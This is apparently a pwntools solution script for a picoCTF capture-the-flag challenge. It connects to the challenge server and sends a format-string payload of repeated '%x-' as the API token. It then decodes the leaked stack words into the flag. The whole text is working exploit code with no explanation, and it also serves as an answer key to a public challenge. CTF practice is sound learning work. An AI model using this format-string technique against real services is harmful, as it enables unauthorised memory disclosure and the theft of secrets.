from pwn import *
r = remote('mercury.picoctf.net','20195')
r.recvuntil('View my portfolio')
r.sendline('1')
r.recvuntil("What is your API token?")
r.sendline('%x-'*50)
r.recvuntil('Buying stonks with token:\n')
leak = r.recvline().decode('utf8').split('-')
flag = []
for data in leak:
  try:
    flag.append(bytearray.fromhex(data).decode())
  except:
    continue

print(''.join([data[::-1] for data in flag])+"}")  